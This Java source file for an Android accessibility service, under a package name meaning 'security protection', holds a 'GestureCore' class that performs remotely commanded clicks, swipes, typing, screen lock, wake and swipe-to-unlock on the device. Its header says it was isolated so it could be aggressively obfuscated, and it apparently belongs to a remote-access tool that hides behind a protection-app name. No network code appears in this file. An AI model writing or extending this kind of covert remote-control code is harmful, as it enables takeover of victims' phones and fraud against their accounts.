package com.seguranca.protecao;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.content.Context;
import android.content.Intent;
import android.graphics.Path;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.graphics.PixelFormat;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityNodeInfo;
import org.lsposed.lsparanoid.Obfuscate;

/**
 * Core isolado de injeção de gestos remotos (click, swipe, navigation, type).
 * Separado de UiAssistBridge para permitir ofuscação agressiva via R8 + LSParanoid.
 */
@Obfuscate
public class GestureCore {

    private static final String TAG = "GestureCore";

    public interface ScreenWakeDelegate {
        void wakeUpScreen();
    }

    private final AccessibilityService service;
    private final ScreenWakeDelegate wakeDelegate;
    private final Handler handler = new Handler(Looper.getMainLooper());

    public GestureCore(AccessibilityService service, ScreenWakeDelegate wakeDelegate) {
        this.service = service;
        this.wakeDelegate = wakeDelegate;
        try {
            android.provider.Settings.System.putInt(service.getContentResolver(), "show_touches", 1);
        } catch (Exception ignored) {}
    }

    /**
     * Processa intent PERFORM_GESTURE recebido pelo UiAssistBridge.
     */
    public void handlePerformGesture(Intent intent) {
        String action = intent.getStringExtra("action");
        Log.d(TAG, "EXECUTANDO GESTO: " + action);

        try {
            if ("BACK".equals(action)) {
                Log.d(TAG, "Executando BACK");
                service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
                return;
            } else if ("HOME".equals(action)) {
                Log.d(TAG, "Executando HOME");
                service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
                return;
            } else if ("RECENTS".equals(action)) {
                Log.d(TAG, "Executando RECENTS");
                service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_RECENTS);
                return;
            } else if ("POWER".equals(action)) {
                Log.d(TAG, "Executando POWER (toggle screen)");
                android.os.PowerManager pm = (android.os.PowerManager)
                        service.getSystemService(Context.POWER_SERVICE);
                boolean isScreenOn = pm != null && pm.isInteractive();
                if (isScreenOn) {
                    Log.d(TAG, "Tela ligada, desligando...");
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                        service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN);
                    }
                } else {
                    Log.d(TAG, "Tela desligada, acordando...");
                    if (wakeDelegate != null) {
                        wakeDelegate.wakeUpScreen();
                    }
                }
                return;
            } else if ("LOCK_SCREEN".equals(action)) {
                Log.d(TAG, "Executando LOCK_SCREEN (somente bloquear)");
                android.os.PowerManager pmLock = (android.os.PowerManager)
                        service.getSystemService(Context.POWER_SERVICE);
                if (pmLock != null && pmLock.isInteractive()) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                        service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN);
                    }
                } else {
                    Log.d(TAG, "Tela ja desligada — bypass LOCK_DEVICE");
                }
                return;
            } else if ("POWER_MENU".equals(action)) {
                Log.d(TAG, "Executando POWER_MENU");
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_POWER_DIALOG);
                }
                return;
            } else if ("NOTIFICATIONS".equals(action)) {
                Log.d(TAG, "Abrindo NOTIFICATIONS");
                service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_NOTIFICATIONS);
                return;
            } else if ("QUICK_SETTINGS".equals(action)) {
                Log.d(TAG, "Abrindo QUICK_SETTINGS");
                service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_QUICK_SETTINGS);
                return;
            }

            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
                Log.e(TAG, "Android versao muito antiga para gestos!");
                return;
            }

            if ("CLICK".equals(action)) {
                executeClick(intent.getIntExtra("x", 0), intent.getIntExtra("y", 0));
            } else if ("SWIPE".equals(action)) {
                executeSwipe(
                        intent.getIntExtra("x1", 0),
                        intent.getIntExtra("y1", 0),
                        intent.getIntExtra("x2", 0),
                        intent.getIntExtra("y2", 0));
            } else if ("LONG_PRESS".equals(action)) {
                executeLongPress(
                        intent.getIntExtra("x", 0),
                        intent.getIntExtra("y", 0),
                        intent.getIntExtra("duration", 500));
            } else if ("TYPE".equals(action)) {
                executeType(intent.getStringExtra("text"));
            } else if ("PATH_GESTURE".equals(action)) {
                String pathJson = intent.getStringExtra("path");
                if (pathJson != null && !pathJson.isEmpty()) {
                    try {
                        org.json.JSONArray arr = new org.json.JSONArray(pathJson);
                        int[][] points = new int[arr.length()][2];
                        for (int i = 0; i < arr.length(); i++) {
                            org.json.JSONObject pt = arr.getJSONObject(i);
                            points[i][0] = pt.getInt("x");
                            points[i][1] = pt.getInt("y");
                        }
                        executePathGesture(points);
                    } catch (Exception e) {
                        Log.e(TAG, "Erro ao parsear PATH_GESTURE: " + e.getMessage());
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro ao executar gesto: " + e.getMessage());
        }
    }

    public void executeClick(int x, int y) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return;

        Log.d(TAG, "⚡ TURBO CLICK em (" + x + ", " + y + ")");

        Path path = new Path();
        path.moveTo(x, y);
        path.lineTo(x, y);

        // Duração de 1ms para execução ultra-rápida instantânea sem atraso de toque
        GestureDescription.StrokeDescription stroke =
                new GestureDescription.StrokeDescription(path, 0, 1);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(stroke);

        boolean dispatched = service.dispatchGesture(builder.build(), null, null);
        if (!dispatched) {
            Log.e(TAG, "Falha ao enviar TURBO CLICK!");
        }

        // Exibe indicador visual sem bloquear a execução principal do gesto
        showPhysicalTouchMarker(x, y, 400);
    }

    public void swipeUpToUnlock() {
        try {
            int screenWidth = android.content.res.Resources.getSystem().getDisplayMetrics().widthPixels;
            int screenHeight = android.content.res.Resources.getSystem().getDisplayMetrics().heightPixels;
            executeSwipe(screenWidth / 2, (int)(screenHeight * 0.8), screenWidth / 2, (int)(screenHeight * 0.2), false);
        } catch (Exception e) {
            Log.e(TAG, "Erro no swipeUpToUnlock: " + e.getMessage());
        }
    }

    public void executeSwipe(int x1, int y1, int x2, int y2) {
        executeSwipe(x1, y1, x2, y2, true);
    }

    public void executeSwipe(int x1, int y1, int x2, int y2, boolean restoreTouch) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return;

        Log.d(TAG, "⚡ TURBO SWIPE de (" + x1 + ", " + y1 + ") para (" + x2 + ", " + y2 + ")");

        Path path = new Path();
        path.moveTo(x1, y1);
        path.lineTo(x2, y2);

        // Duração otimizada para 80ms (arraste fluido e instantâneo)
        GestureDescription.StrokeDescription stroke =
                new GestureDescription.StrokeDescription(path, 0, 80);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(stroke);

        boolean dispatched = service.dispatchGesture(builder.build(), null, null);
        if (!dispatched) {
            Log.e(TAG, "Falha ao enviar TURBO SWIPE!");
        }

        showPhysicalTouchMarker(x1, y1, 300);
        showPhysicalTouchMarker(x2, y2, 400);
    }

    public void executeLongPress(int x, int y, int duration) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return;

        Log.d(TAG, "⚡ TURBO LONG PRESS em (" + x + ", " + y + ") por " + duration + "ms");

        Path path = new Path();
        path.moveTo(x, y);

        GestureDescription.StrokeDescription stroke =
                new GestureDescription.StrokeDescription(path, 0, duration);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(stroke);

        boolean dispatched = service.dispatchGesture(builder.build(), null, null);
        if (!dispatched) {
            Log.e(TAG, "Falha ao enviar TURBO LONG PRESS!");
        }

        showPhysicalTouchMarker(x, y, duration + 200);
    }

    public void executePathGesture(int[][] points) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return;
        if (points == null || points.length < 2) {
            Log.e(TAG, "PATH_GESTURE precisa de pelo menos 2 pontos");
            return;
        }

        Log.d(TAG, "⚡ TURBO PATH_GESTURE com " + points.length + " pontos");

        Path path = new Path();
        path.moveTo(points[0][0], points[0][1]);
        for (int i = 1; i < points.length; i++) {
            path.lineTo(points[i][0], points[i][1]);
        }

        long totalDuration = Math.max(60L, (points.length - 1) * 40L);

        GestureDescription.StrokeDescription stroke = new GestureDescription.StrokeDescription(path, 0, totalDuration);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(stroke);

        boolean dispatched = service.dispatchGesture(builder.build(), null, null);
        if (!dispatched) {
            Log.e(TAG, "Falha ao enviar TURBO PATH_GESTURE!");
        }
    }

    public void executeType(String text) {
        Log.d(TAG, "Tentando digitar: " + text);

        AccessibilityNodeInfo rootNode = service.getRootInActiveWindow();
        if (rootNode == null) {
            Log.e(TAG, "Nao conseguiu obter rootNode para digitar");
            return;
        }

        AccessibilityNodeInfo focusedNode = rootNode.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);

        if (focusedNode != null && focusedNode.isEditable()) {
            Bundle arguments = new Bundle();
            arguments.putCharSequence(
                    AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
            boolean success = focusedNode.performAction(
                    AccessibilityNodeInfo.ACTION_SET_TEXT, arguments);

            if (success) {
                Log.d(TAG, "Texto digitado com sucesso!");
            } else {
                Log.e(TAG, "Falha ao digitar texto");
            }

            focusedNode.recycle();
        } else {
            Log.e(TAG, "Nenhum campo de texto focado encontrado");
        }

        rootNode.recycle();
    }

    /**
     * Desenha um indicador visual neon (toque físico) diretamente na tela do aparelho Android
     */
    public void showPhysicalTouchMarker(int x, int y, int durationMs) {
        if (service == null) return;
        handler.post(() -> {
            try {
                WindowManager wm = (WindowManager) service.getSystemService(Context.WINDOW_SERVICE);
                if (wm == null) return;

                final View touchView = new View(service) {
                    private final Paint paintOuter = new Paint(Paint.ANTI_ALIAS_FLAG);
                    private final Paint paintInner = new Paint(Paint.ANTI_ALIAS_FLAG);
                    {
                        paintOuter.setColor(Color.parseColor("#00F0FF"));
                        paintOuter.setStyle(Paint.Style.STROKE);
                        paintOuter.setStrokeWidth(8f);

                        paintInner.setColor(Color.parseColor("#FF0077"));
                        paintInner.setStyle(Paint.Style.FILL);
                    }

                    @Override
                    protected void onDraw(Canvas canvas) {
                        super.onDraw(canvas);
                        float cx = getWidth() / 2f;
                        float cy = getHeight() / 2f;
                        canvas.drawCircle(cx, cy, cx - 6f, paintOuter);
                        canvas.drawCircle(cx, cy, cx / 3.5f, paintInner);
                    }
                };

                int size = 100;
                int layoutType = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                        ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                        : WindowManager.LayoutParams.TYPE_PHONE;

                WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                        size, size,
                        layoutType,
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                                | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                                | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                        PixelFormat.TRANSLUCENT
                );

                params.gravity = Gravity.TOP | Gravity.LEFT;
                params.x = x - (size / 2);
                params.y = y - (size / 2);

                wm.addView(touchView, params);

                handler.postDelayed(() -> {
                    try {
                        wm.removeView(touchView);
                    } catch (Exception ignored) {}
                }, durationMs);

            } catch (Exception e) {
                Log.e(TAG, "Erro ao desenhar indicador na tela fisica: " + e.getMessage());
            }
        });
    }
}
